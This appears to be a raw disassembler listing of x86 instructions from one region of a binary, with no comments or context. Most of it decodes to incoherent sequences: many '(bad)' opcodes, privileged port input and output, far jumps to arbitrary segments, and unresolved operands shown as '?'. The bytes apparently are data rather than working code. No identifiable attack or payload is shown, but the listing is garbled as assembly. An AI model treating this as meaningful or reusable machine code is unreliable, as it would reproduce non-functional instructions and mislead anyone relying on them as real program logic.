  4158c4:	mov    ebp,DWORD PTR [edx]
  4158c6:	mov    al,ds:0x9d8d2596
  4158cb:	mov    ds:0x3f09af8,eax
  4158d0:	inc    esi
  4158d1:	and    DWORD PTR [ebx-0x5aa70bb2],0x66
  4158d8:	lea    ebp,[eax]
  4158da:	pop    eax
  4158db:	ins    BYTE PTR es:[edi],dx
  4158dc:	xor    bh,BYTE PTR [ecx-0x237191a5]
  4158e2:	gs ret 0xc37a
  4158e6:	dec    esi
  4158e7:	push   es
  4158e8:	rcl    BYTE PTR [eax],0x4f
  4158eb:	cmp    al,BYTE PTR ss:[edi+0x6fbf7cc7]
  4158f2:	test   DWORD PTR [ecx-0x12],esi
  4158f5:	mov    eax,ds:0x1f5b3dcf
  4158fa:	(bad)  
  4158fb:	in     eax,dx
  4158fc:	popf   
  4158fd:	push   edx
  4158fe:	sub    BYTE PTR [edx+0xe],ch
  415901:	fs int 0x38
  415904:	mov    ecx,?
  415906:	jle    0x415925
  415908:	mov    ebp,0xae5d89e1
  41590d:	sub    dh,BYTE PTR [edi+ebp*8-0x26]
  415911:	outs   dx,DWORD PTR ds:[esi]
  415912:	push   esp
  415913:	not    BYTE PTR [ecx+0x2bdd2651]
  415919:	and    DWORD PTR [eax],edi
  41591b:	cs jmp 0x41590a
  41591e:	mov    ds:0xbe9ea276,eax
  415923:	aam    0x1
  415925:	mov    DWORD PTR ds:0xa0387dce,eax
  41592b:	fsubr  DWORD PTR [ecx]
  41592d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41592e:	cmp    DWORD PTR [edx],edx
  415930:	aas    
  415931:	sub    ebp,edx
  415933:	pop    es
  415934:	mov    ah,0x21
  415936:	mov    dl,0xeb
  415938:	fdivr  QWORD PTR [eax]
  41593a:	cwde   
  41593b:	mov    al,0x3
  41593d:	mov    ah,0xd2
  41593f:	sub    ebx,DWORD PTR [edi]
  415941:	jl     0x4158d6
  415943:	push   edi
  415944:	(bad)  
  415945:	dec    eax
  415946:	sbb    ah,BYTE PTR [edi]
  415948:	stos   BYTE PTR es:[edi],al
  415949:	jae    0x415983
  41594b:	jmp    0xbb15dd15
  415950:	and    dl,ch
  415952:	push   edx
  415953:	scas   al,BYTE PTR es:[edi]
  415954:	mov    eax,0xdd075e76
  415959:	clc    
  41595a:	jecxz  0x415907
  41595c:	jns    0x41591c
  41595e:	daa    
  41595f:	int    0xcc
  415961:	jmp    0xb061:0xc19cb598
  415968:	pusha  
  415969:	les    eax,FWORD PTR [edx-0x19]
  41596c:	push   DWORD PTR [edi+0x5789b1fc]
  415972:	dec    ecx
  415973:	shl    BYTE PTR [eax+eax*2+0x1],0x6c
  415978:	push   esp
  415979:	inc    ebp
  41597a:	pop    ebp
  41597b:	mov    al,0x73
  41597d:	loope  0x4159c3
  41597f:	push   DWORD PTR [esi+0x24]
  415982:	mov    al,ds:0x65a01d81
  415987:	jo     0x41595a
  415989:	sub    eax,0xda45c077
  41598e:	xchg   DWORD PTR [eax],edx
	...
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	push   ebx
  415a01:	xor    BYTE PTR [ebx+0xe424e9],ah
  415a07:	add    BYTE PTR [ecx+eax*1],al
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	out    dx,al
  415a0d:	aaa    
  415a0e:	mov    DWORD PTR [esi],edi
  415a10:	xor    ecx,DWORD PTR [eax+0x4312b800]
  415a16:	stos   BYTE PTR es:[edi],al
  415a17:	or     DWORD PTR [edi-0x1c],0xfffffffe
  415a1b:	test   BYTE PTR [edi+ecx*8-0x23],ch
  415a1f:	push   ebx
  415a20:	in     al,dx
  415a21:	inc    ecx
  415a22:	out    0x79,al
  415a24:	or     al,0x65
  415a26:	cmc    
  415a27:	sub    BYTE PTR [eax-0x32],bh
  415a2a:	aaa    
  415a2b:	cli    
  415a2c:	es sub DWORD PTR gs:[esi],ecx
  415a30:	clc    
  415a31:	ror    bl,cl
  415a33:	jle    0x415a7d
  415a35:	sahf   
  415a36:	dec    ebx
  415a37:	dec    ecx
  415a38:	in     eax,0x47
  415a3a:	sbb    eax,eax
  415a3c:	scas   al,BYTE PTR es:[edi]
  415a3d:	cmp    bh,ah
  415a3f:	push   cs
  415a40:	aad    0x57
  415a42:	jmp    0x415a4a
  415a44:	and    eax,0xfcd3da8b
  415a49:	sub    al,0xa1
  415a4b:	imul   DWORD PTR [eax-0x13]
  415a4e:	or     ebx,DWORD PTR [eax+0x23]
  415a51:	pop    edi
  415a52:	fwait
  415a53:	sub    ch,BYTE PTR ds:0x289ce308
  415a59:	lahf   
  415a5a:	pop    esi
  415a5b:	inc    ebx
  415a5c:	xchg   edx,eax
  415a5d:	into   
  415a5e:	call   0x77c091d4
  415a63:	cwde   
  415a64:	je     0x415ad2
  415a66:	scas   eax,DWORD PTR es:[edi]
  415a67:	call   0x75f041cf
  415a6c:	inc    edx
  415a6d:	lea    esi,[eax+edi*8-0x5b]
  415a71:	pop    eax
  415a72:	jb     0x415a5b
  415a74:	neg    bh
  415a76:	xchg   ebx,eax
  415a77:	sahf   
  415a78:	mov    ebx,?
  415a7a:	xor    ch,dh
  415a7c:	xor    dh,ch
  415a7e:	sbb    ecx,DWORD PTR [ebp+0x41]
  415a81:	sub    eax,0x7323a6e5
  415a86:	mov    bl,0x28
  415a88:	jmp    0x415a68
  415a8a:	inc    edx
  415a8b:	enter  0x298f,0x3c
  415a8f:	lods   eax,DWORD PTR ds:[esi]
  415a90:	mov    ch,0xc3
  415a92:	jno    0x415a2d
  415a94:	scas   eax,DWORD PTR es:[edi]
  415a95:	dec    ebp
  415a96:	add    ebp,DWORD PTR [edx-0x1b]
  415a99:	mov    ebx,0x5fce10d5
  415a9e:	sbb    ebx,edi
  415aa0:	in     al,dx
  415aa1:	ror    DWORD PTR [edx],1
  415aa3:	inc    ecx
  415aa4:	stc    
  415aa5:	shl    edx,cl
  415aa7:	xchg   esp,eax
  415aa8:	or     al,0x2b
  415aaa:	les    ecx,FWORD PTR [esi-0x1]
  415aad:	push   ecx
  415aae:	push   edx
  415aaf:	push   0x12
  415ab1:	xchg   edi,eax
  415ab2:	pop    ebp
  415ab3:	and    edi,ebp
  415ab5:	out    0x76,al
  415ab7:	scas   al,BYTE PTR es:[edi]
  415ab8:	add    ah,BYTE PTR [edi+0x3b]
  415abb:	mov    ebp,0xb1f17c30
  415ac0:	push   esi
  415ac1:	xor    cl,0xcb
  415ac4:	dec    ebx
  415ac5:	sub    cl,dh
  415ac7:	mov    bl,0x5
  415ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aca:	in     eax,0x47
  415acc:	xchg   edi,eax
  415acd:	pop    edx
  415ace:	retf   
  415acf:	cmp    bh,dh
  415ad1:	dec    ebp
  415ad2:	das    
  415ad3:	scas   eax,DWORD PTR es:[edi]
  415ad4:	push   esi
  415ad5:	fidivr DWORD PTR [eax]
  415ad7:	mov    WORD PTR ds:0xad2c0d6b,ds
  415add:	(bad)  
  415ade:	mov    bl,0xaa
  415ae0:	jno    0x415b0e
  415ae2:	in     al,0x92
  415ae4:	jl     0x415b31
  415ae6:	call   0x96a6:0x4f3caaf1
  415aed:	mov    ds:0xb09a2662,al
  415af2:	mov    gs,WORD PTR [edi+0x2e8eec58]
  415af8:	sub    al,0x32
  415afa:	iret   
  415afb:	(bad)  
  415afc:	mov    ecx,0x9c195285
  415b01:	push   ss
  415b02:	loope  0x415ae5
  415b04:	and    edi,0xa27d62da
  415b0a:	aam    0x3c
  415b0c:	add    ebx,ebp
  415b0e:	xor    edi,DWORD PTR ds:0x0
	...
  415b74:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fmul   st(7),st
  415b81:	lea    ebp,[eax]
  415b83:	int    0x28
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR [ecx+eax*1],al
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	in     al,dx
  415b8d:	or     bl,BYTE PTR ds:0xe69b4df5
  415b93:	lods   eax,DWORD PTR ds:[esi]
  415b94:	clc    
  415b95:	ja     0x415b56
  415b97:	(bad)  
  415b98:	xchg   ecx,eax
  415b99:	inc    ecx
  415b9a:	add    BYTE PTR [edi],al
  415b9c:	fwait
  415b9d:	imul   esi,DWORD PTR [ebx],0x5
  415ba0:	test   edx,0xc16cad11
  415ba6:	adc    DWORD PTR [ecx],eax
  415ba8:	stc    
  415ba9:	dec    esp
  415baa:	icebp  
  415bab:	rol    edx,0xc0
  415bae:	icebp  
  415baf:	shr    BYTE PTR [edx],1
  415bb1:	mov    WORD PTR [ecx+0x76aa4eba],fs
  415bb7:	xor    ebx,DWORD PTR [ebx]
  415bb9:	jecxz  0x415c17
  415bbb:	sbb    al,0x53
  415bbd:	ins    DWORD PTR es:[edi],dx
  415bbe:	hlt    
  415bbf:	fwait
  415bc0:	mov    al,ds:0xb0da5b4
  415bc5:	into   
  415bc6:	xchg   esp,eax
  415bc7:	xchg   DWORD PTR [ebx-0x58],edx
  415bca:	or     bl,BYTE PTR [esi+0x20]
  415bcd:	lahf   
  415bce:	outs   dx,BYTE PTR ds:[esi]
  415bcf:	pop    edi
  415bd0:	in     eax,dx
  415bd1:	mov    edx,0x1d837857
  415bd6:	xchg   ebx,eax
  415bd7:	jo     0x415bb3
  415bd9:	pusha  
  415bda:	jo     0x415c29
  415bdc:	sbb    DWORD PTR [esi-0x5839f3d8],ebp
  415be2:	loop   0x415c35
  415be4:	mov    al,ds:0x5b6db988
  415be9:	pop    eax
  415bea:	adc    al,0x7d
  415bec:	lahf   
  415bed:	rcr    DWORD PTR [esi],cl
  415bef:	fld    DWORD PTR [ebx+0x724937e5]
  415bf5:	ins    BYTE PTR es:[di],dx
  415bf7:	xor    cl,dh
  415bf9:	fstp   QWORD PTR [ebx]
  415bfb:	aam    0x23
  415bfd:	xlat   BYTE PTR ds:[ebx]
  415bfe:	mov    esi,0xe773c7d7
  415c03:	xchg   DWORD PTR [ecx+0x3353b04a],esi
  415c09:	stos   DWORD PTR es:[edi],eax
  415c0a:	fs fld TBYTE PTR cs:[esi+0x4cf6a18e]
  415c12:	xor    bl,ah
  415c14:	out    dx,eax
  415c15:	push   edi
  415c16:	sbb    ecx,DWORD PTR [edi+0x68]
  415c19:	sub    eax,0xbace4aa1
  415c1e:	(bad)  
  415c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c21:	or     eax,0x762b31da
  415c26:	dec    ecx
  415c27:	call   0xcd2f:0x80eb270a
  415c2e:	imul   ebx,DWORD PTR [ecx+0x47edc560],0x2e29dad6
  415c38:	test   al,0x99
  415c3a:	hlt    
  415c3b:	test   DWORD PTR [eax-0x2d],eax
  415c3e:	lods   eax,DWORD PTR ds:[esi]
  415c3f:	sbb    al,0x54
  415c41:	or     eax,0xb8fb12d3
  415c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c47:	fnstcw WORD PTR [esi+0x5bc8a3eb]
  415c4d:	jne    0x415cb1
  415c4f:	(bad)  
  415c50:	js     0x415c28
  415c52:	xchg   ebx,eax
  415c53:	dec    esp
  415c54:	stos   DWORD PTR es:[edi],eax
  415c55:	or     bl,BYTE PTR [ebx-0x23]
  415c58:	cmp    eax,0xc60c6eb4
  415c5d:	or     al,0xc5
  415c5f:	mov    cl,0x24
  415c61:	stos   BYTE PTR es:[edi],al
  415c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c63:	xor    esi,DWORD PTR [ecx*1-0x725a2130]
  415c6a:	(bad)  
  415c6c:	sbb    DWORD PTR [edx+0x67],0xffffffcf
  415c70:	jmp    0x287c:0x5a53567
  415c77:	adc    eax,DWORD PTR [esi]
  415c79:	ss jno 0x415caa
  415c7c:	int    0x47
  415c7e:	jg     0x415cd2
  415c80:	into   
  415c81:	jae    0x415cc4
  415c83:	enter  0x2bb4,0x2b
  415c87:	jle    0x415d04
  415c89:	sar    BYTE PTR [eax+0x6af3490b],cl
  415c8f:	repz add BYTE PTR [eax],al
	...
  415cf2:	add    BYTE PTR [eax],al
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x665e681f
  415d03:	cmp    eax,0xe62c
  415d08:	add    al,0x1
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	cmp    esp,DWORD PTR [ecx+0x9d73cb1]
  415d12:	adc    dh,al
  415d14:	push   es
  415d15:	push   ss
  415d16:	or     eax,0x68d38716
  415d1b:	or     al,0x7a
  415d1d:	rcl    BYTE PTR [ebp+0x7b4c8de8],1
  415d23:	jmp    0x415d50
  415d25:	push   eax
  415d26:	sbb    al,0xd3
  415d28:	add    BYTE PTR [edi],dl
  415d2a:	cmp    ebx,DWORD PTR [ebx]
  415d2c:	call   0x2429e0b9
  415d31:	dec    edi
  415d32:	adc    ch,BYTE PTR [ebx]
  415d34:	cmp    bh,BYTE PTR [esi]
  415d36:	cli    
  415d37:	xchg   ebp,eax
  415d38:	jge    0x415cd4
  415d3a:	fiadd  WORD PTR [ecx-0x18]
  415d3d:	sub    DWORD PTR cs:[esi],edx
  415d40:	xchg   ebx,eax
  415d41:	fnsave [edi-0x5e07056b]
  415d47:	mov    dh,0x13
  415d49:	jnp    0x415dc0
  415d4b:	(bad)  
  415d4d:	and    DWORD PTR [ecx-0x8],ecx
  415d50:	inc    edx
  415d51:	cmp    eax,0xd6706a73
  415d56:	push   0x9b3b6245
  415d5b:	stos   BYTE PTR es:[edi],al
  415d5c:	mov    al,0x57
  415d5e:	sti    
  415d5f:	add    BYTE PTR [edi*2-0x1badff04],bl
  415d66:	xor    al,0x7
  415d68:	popaw  
  415d6a:	adc    al,ch
  415d6c:	es cmp eax,0xc7591837
  415d72:	adc    ch,al
  415d74:	pop    eax
  415d75:	adc    esi,DWORD PTR ds:0xcb5046f2
  415d7b:	adc    DWORD PTR [ebx+0x69e1e6b3],edi
  415d81:	sbb    al,0x6b
  415d83:	mov    al,0xf6
  415d85:	jle    0x415dd0
  415d87:	and    cl,BYTE PTR [ebp-0x4734bdef]
  415d8d:	imul   edi,DWORD PTR [ecx],0xffffff90
  415d90:	dec    edx
  415d91:	rcl    BYTE PTR [esi-0x1266f4e9],1
  415d97:	sbb    cl,BYTE PTR [esi+ebx*1]
  415d9a:	inc    ebx
  415d9b:	pop    esp
  415d9c:	scas   eax,DWORD PTR es:[edi]
  415d9d:	aam    0x14
  415d9f:	sub    eax,0xeb11ab87
  415da4:	push   ecx
  415da5:	mov    eax,DWORD PTR [edx-0x7844ff08]
  415dab:	adc    DWORD PTR [eax-0xc],eax
  415dae:	cmp    ebx,DWORD PTR [ecx-0x3f]
  415db1:	dec    ebx
  415db2:	aaa    
  415db3:	xor    edx,DWORD PTR [esi+0x2b]
  415db6:	sahf   
  415db7:	es cdq 
  415db9:	jbe    0x415e0e
  415dbb:	push   edi
  415dbc:	xor    DWORD PTR [eax-0x7ec498f8],ecx
  415dc2:	and    BYTE PTR [ebp+esi*8+0x4d4d7572],bh
  415dc9:	and    ebx,DWORD PTR ds:0x6163eb12
  415dcf:	or     ch,al
  415dd1:	adc    BYTE PTR [edx+0x7a76ec98],ch
  415dd7:	enter  0x14e2,0x23
  415ddb:	pop    eax
  415ddc:	rcl    BYTE PTR [ecx+0x4f],0xbb
  415de0:	outs   dx,BYTE PTR ds:[esi]
  415de1:	shr    dh,1
  415de3:	pushf  
  415de4:	push   edx
  415de5:	rcl    DWORD PTR [ebp-0x5ddb8710],0xbd
  415dec:	loope  0x415e23
  415dee:	mov    ch,0x51
  415df0:	(bad)  
  415df1:	dec    ecx
  415df2:	loopne 0x415d8b
  415df4:	mov    BYTE PTR ds:0x37cddd12,dh
  415dfa:	mov    dl,0xd4
  415dfc:	sub    bh,BYTE PTR [ebx]
  415dfe:	and    bl,cl
  415e00:	repnz loop 0x415e5b
  415e03:	or     eax,0xf694d853
  415e08:	or     DWORD PTR [edx+0x75690ef0],ebp
  415e0e:	icebp  
  415e0f:	mov    ds:0x0,eax
	...
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x2]
  415e81:	lahf   
  415e82:	idiv   BYTE PTR [ebx+0x30]
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR [ecx+eax*1],al
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	xchg   BYTE PTR [ebp-0x21e77216],ah
  415e92:	enter  0x98d,0xa5
  415e96:	cmp    al,0xd3
  415e98:	or     eax,0x5b58ef89
  415e9d:	mov    ebp,0xf4538cfb
  415ea2:	mov    esi,0xc310f486
  415ea7:	adc    dh,bh
  415ea9:	inc    ebp
  415eaa:	push   edi
  415eab:	or     eax,0x183500
  415eb0:	(bad)  
  415eb2:	dec    ebx
  415eb3:	(bad)  
  415eb4:	xchg   edi,eax
  415eb5:	and    dh,al
  415eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eb8:	sbb    bl,0xee
  415ebb:	in     eax,dx
  415ebc:	out    dx,eax
  415ebd:	pop    ebx
  415ebe:	sar    DWORD PTR [ebp+esi*2+0x3ccd6021],0xa0
  415ec6:	add    DWORD PTR [esi+0x72],esp
  415ec9:	lods   eax,DWORD PTR ds:[esi]
  415eca:	cmp    eax,edx
  415ecc:	(bad)  
  415ecd:	mov    WORD PTR [ebx-0x599a88d5],ds
  415ed3:	mov    ebx,0xa2affa19
  415ed8:	jp     0x415e90
  415eda:	inc    ebx
  415edb:	push   cs
  415edc:	aas    
  415edd:	or     DWORD PTR [edi+edi*8],0xffffff8c
  415ee1:	jnp    0x415e9b
  415ee3:	mov    ecx,edi
  415ee5:	push   ss
  415ee6:	xchg   ecx,eax
  415ee7:	pop    esi
  415ee8:	retf   
  415ee9:	aas    
  415eea:	dec    ebp
  415eeb:	fs dec edi
  415eed:	popa   
  415eee:	aaa    
  415eef:	jmp    0xaa5e47cb
  415ef4:	dec    ebp
  415ef5:	hlt    
  415ef6:	in     eax,0x2c
  415ef8:	loop   0x415f41
  415efa:	xor    dl,dh
  415efc:	sub    eax,0x60d95ede
  415f01:	sbb    DWORD PTR [ecx-0xa0a9ebc],edi
  415f07:	push   DWORD PTR [eax]
  415f09:	enter  0x2ab9,0x94
  415f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f0e:	add    ch,BYTE PTR [esi+0x1c]
  415f11:	adc    al,0x9f
  415f13:	mov    DWORD PTR [ebp-0x26e84ee5],ebx
  415f19:	es xchg ecx,eax
  415f1b:	add    eax,0x586f99bf
  415f20:	sub    BYTE PTR [edx],dh
  415f22:	mov    dh,BYTE PTR [ebp+0x3e453281]
  415f28:	mov    eax,0x62af44a2
  415f2d:	sbb    edi,ebp
  415f2f:	push   es
  415f30:	push   0xffffffd4
  415f32:	inc    edx
  415f33:	dec    esi
  415f34:	enter  0x13b1,0x8
  415f38:	add    al,0x60
  415f3a:	jle    0x415f20
  415f3c:	in     eax,0x4c
  415f3e:	pop    esi
  415f3f:	add    bl,al
  415f41:	mov    edi,0x4665407f
  415f46:	fs mov bl,0xdf
  415f49:	in     al,dx
  415f4a:	jbe    0x415f93
  415f4c:	neg    eax
  415f4e:	out    0x3d,eax
  415f50:	mov    WORD PTR [esi+0x6ba3fa53],ds
  415f56:	gs inc ecx
  415f58:	je     0x415f21
  415f5a:	mov    ebp,0x352adb73
  415f5f:	(bad)  
  415f60:	jmp    0x415f64
  415f62:	inc    ecx
  415f63:	dec    edi
  415f64:	xor    edi,ebx
  415f66:	xchg   ecx,eax
  415f67:	jl     0x415fa0
  415f69:	cmp    eax,0xb13d722d
  415f6e:	imul   edx,DWORD PTR [edi],0x68bafab1
  415f74:	div    DWORD PTR [esi+ebp*4+0x5ff415c0]
  415f7b:	mov    eax,0x49d3aff2
  415f80:	out    dx,eax
  415f81:	into   
  415f82:	cdq    
  415f83:	add    edi,ecx
  415f85:	stos   BYTE PTR es:[edi],al
  415f86:	mov    al,ds:0x1f0b29cd
  415f8b:	adc    eax,0x3eed5010
	...
  415ff4:	pop    ss
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	mov    eax,0x34caba8a
  416005:	call   0x145600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	les    ebp,FWORD PTR [esi]
  41600e:	pop    ebp
  41600f:	mov    BYTE PTR [ecx+0x2b577ede],al
  416015:	sbb    bh,0xca
  416018:	cld    
  416019:	repnz mov ah,0xfa
  41601c:	in     al,dx
  41601d:	lods   eax,DWORD PTR ds:[esi]
  41601e:	and    DWORD PTR [esp+eiz*2-0x75],ecx
  416022:	pop    ebp
  416023:	adc    DWORD PTR [edx-0x54],edi
  416026:	lds    edi,FWORD PTR [edx-0x23]
  416029:	dec    edx
  41602a:	xor    edx,DWORD PTR [edi-0x329ec912]
  416030:	or     al,BYTE PTR [edx+0x3d]
  416033:	into   
  416034:	cmp    DWORD PTR [eax-0x5d0f4f25],edi
  41603a:	push   cs
  41603b:	pop    es
  41603c:	dec    ebp
  41603d:	pop    ss
  41603e:	push   DWORD PTR [eax]
  416040:	or     BYTE PTR [edx+0x36],ah
  416043:	push   0x28
  416045:	iret   
  416046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416047:	mov    eax,ds:0xef3dbc9c
  41604c:	shr    ecx,1
  41604e:	(bad)  
  416050:	in     eax,dx
  416051:	or     esi,edx
  416053:	data16 sub bh,ah
  416056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416057:	loopne 0x41603a
  416059:	push   es
  41605a:	mov    al,0x34
  41605c:	jp     0x41602f
  41605e:	xor    bl,bl
  416060:	ja     0x416083
  416062:	mov    gs,WORD PTR [ebp+ebp*4-0x5e]
  416066:	std    
  416067:	jae    0x4160a4
  416069:	jge    0x41604b
  41606b:	sbb    eax,0x284a9848
  416070:	mov    ebp,DWORD PTR [ecx-0x5661a32a]
  416076:	rcl    DWORD PTR [ecx+esi*8],cl
  416079:	jle    0x41604e
  41607b:	stos   BYTE PTR es:[edi],al
  41607c:	mov    esi,0x9e940405
  416081:	cvtps2pi mm3,QWORD PTR [ebx]
  416084:	push   edi
  416085:	jae    0x4160c1
  416087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416088:	dec    edi
  416089:	dec    edx
  41608a:	push   cs
  41608b:	jns    0x4160d5
  41608d:	pop    edx
  41608e:	and    al,0xa9
  416090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416091:	inc    ebp
  416092:	fmul   DWORD PTR [esi+0x2a1101ef]
  416098:	inc    esi
  416099:	shl    DWORD PTR [ebp+0x85f482a],1
  41609f:	mov    bh,bh
  4160a1:	(bad)  
  4160a2:	jmp    0xb3a6c49e
  4160a7:	leave  
  4160a8:	iret   
  4160a9:	mov    DWORD PTR [esi],ebp
  4160ab:	jo     0x4160a4
  4160ad:	jno    0x4160db
  4160af:	fadd   QWORD PTR [ecx]
  4160b1:	stc    
  4160b2:	pop    ebx
  4160b3:	xor    BYTE PTR ds:0x9e4d01f8,0x89
  4160ba:	mov    ecx,0x668afbdb
  4160bf:	mov    ah,0x2a
  4160c1:	pop    ebp
  4160c2:	outs   dx,DWORD PTR ds:[esi]
  4160c3:	outs   dx,DWORD PTR ds:[esi]
  4160c4:	xchg   BYTE PTR [ebp+0x74],al
  4160c7:	bound  esp,QWORD PTR [esi]
  4160c9:	fucomi st,st(6)
  4160cb:	adc    cl,ch
  4160cd:	nop
  4160ce:	xor    edx,0x3bbe3891
  4160d4:	inc    esi
  4160d5:	in     eax,0x32
  4160d7:	jg     0x416087
  4160d9:	mov    bh,0xdb
  4160db:	inc    ebp
  4160dc:	addr16 dec ebp
  4160de:	dec    esi
  4160df:	adc    edi,DWORD PTR [ebp+0x1e29bcbe]
  4160e5:	cmc    
  4160e6:	fwait
  4160e7:	sub    BYTE PTR [ebx-0xc594df3],dl
  4160ed:	test   DWORD PTR [ebp+0x43],esp
  4160f0:	rcr    DWORD PTR [ebp+0x2],cl
  4160f3:	shl    esp,0x8
  4160f6:	add    eax,ebp
  4160f8:	and    esi,DWORD PTR [ecx]
  4160fa:	mov    dl,bh
  4160fc:	mov    BYTE PTR ds:0x4a854218,0xc1
  416103:	adc    BYTE PTR [ebp-0x52],0x89
  416107:	and    DWORD PTR [ebx+0x7f4b10a0],esi
  41610d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41610e:	sub    eax,0x50
	...
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0x36bb91f3
  416183:	out    0x38,eax
  416185:	jmp    0x145618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	mov    esp,0xc9b1ba9d
  416191:	push   esi
  416192:	sar    BYTE PTR [eax-0x6a900927],0x96
  416199:	out    dx,eax
  41619a:	xor    DWORD PTR gs:[ecx],edx
  41619d:	and    ebp,ebx
  41619f:	fistp  QWORD PTR [ecx+0x30376572]
  4161a5:	xor    ebp,DWORD PTR [ecx]
  4161a7:	xor    al,0xb2
  4161a9:	xchg   edi,eax
  4161aa:	cld    
  4161ab:	jnp    0x4161f4
  4161ad:	stc    
  4161ae:	inc    ecx
  4161af:	cmp    edx,DWORD PTR [ebx-0x6c]
  4161b2:	mov    DWORD PTR [eax],edx
  4161b4:	js     0x416201
  4161b6:	and    ch,BYTE PTR [ecx*2-0x4d01b3d0]
  4161bd:	jmp    0x4161f0
  4161bf:	aam    0x2
  4161c1:	retf   0x58c9
  4161c4:	leave  
  4161c5:	sub    al,0x2c
  4161c7:	mov    eax,0xfaac1bb6
  4161cc:	(bad)  [ecx+ebp*4-0x26ae9f3b]
  4161d3:	fwait
  4161d4:	inc    DWORD PTR [ecx-0x1a104138]
  4161da:	pop    esi
  4161db:	push   edx
  4161dc:	mov    bl,0xdc
  4161de:	mov    esi,0xf679e9b6
  4161e3:	add    al,0x3c
  4161e5:	ret    
  4161e6:	bound  esp,QWORD PTR [ebx-0x25]
  4161e9:	add    ebp,DWORD PTR [ebx]
  4161eb:	xchg   eax,eax
  4161ed:	sbb    ebp,esi
  4161ef:	out    0x65,al
  4161f1:	lods   al,BYTE PTR ds:[esi]
  4161f2:	sub    BYTE PTR [ebx+0x65c08e2c],bl
  4161f8:	hlt    
  4161f9:	ins    DWORD PTR es:[edi],dx
  4161fa:	sbb    BYTE PTR [ecx+0x4f77bff4],al
  416200:	aas    
  416201:	xchg   edx,eax
  416202:	add    cl,BYTE PTR [ecx]
  416204:	inc    ecx
  416205:	inc    edx
  416206:	mov    BYTE PTR [eax+0x2a8bbb44],bl
  41620c:	js     0x416239
  41620e:	psrad  mm7,QWORD PTR [ebx-0x5842aa4c]
  416215:	cli    
  416216:	retf   0x17db
  416219:	mov    ch,0x7f
  41621b:	test   DWORD PTR [ecx+0x3bd51e6f],edi
  416221:	aad    0xdc
  416223:	mov    dl,0xdf
  416225:	add    bl,bl
  416227:	adc    edi,DWORD PTR [eax+0x57268b44]
  41622d:	outs   dx,DWORD PTR ds:[esi]
  41622e:	mov    bh,0x1f
  416230:	xor    al,0x22
  416232:	daa    
  416233:	rcr    DWORD PTR [ebp-0x4f],cl
  416236:	daa    
  416237:	and    BYTE PTR [ebp-0x7c5ca696],0x1d
  41623e:	xor    BYTE PTR [eax-0x1c],cl
  416241:	dec    esi
  416242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416243:	aam    0x93
  416245:	push   ebx
  416246:	test   al,0xd2
  416248:	jl     0x4161ef
  41624a:	rol    DWORD PTR [edi-0x79],1
  41624d:	add    ch,bl
  41624f:	retf   0x5f1b
  416252:	nop
  416253:	cld    
  416254:	mov    cl,0x84
  416256:	(bad)  
  416257:	pop    ecx
  416258:	enter  0x9071,0x8d
  41625c:	cmp    eax,0x7a8bf56a
  416261:	iret   
  416262:	sub    eax,0xddcb4f55
  416267:	ds cwde 
  416269:	call   DWORD PTR [edx-0x54082847]
  41626f:	inc    ebp
  416270:	(bad)  
  416272:	std    
  416273:	xchg   edx,ebp
  416275:	cmp    WORD PTR [esi+0x64],ax
  416279:	and    eax,0x1426efca
  41627e:	mov    bl,0x14
  416280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416281:	cwde   
  416282:	sti    
  416283:	cmp    eax,0xc6332ea2
  416288:	cld    
  416289:	aaa    
  41628a:	push   0x3fa91e77
  41628f:	aas    
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3c3b:0x3ff35bee
  416305:	jmp    0x0:0x1040000
  41630c:	pop    ecx
  41630d:	out    0x83,al
  41630f:	sub    eax,0x6bd83939
  416314:	jne    0x4162db
  416316:	mov    DWORD PTR [esi+0x4f],ebp
  416319:	sub    eax,0x43a68485
  41631e:	inc    ebp
  41631f:	push   esi
  416320:	into   
  416321:	mov    bh,0x62
  416323:	int    0xe5
  416325:	and    esi,edx
  416327:	in     al,0x45
  416329:	dec    esp
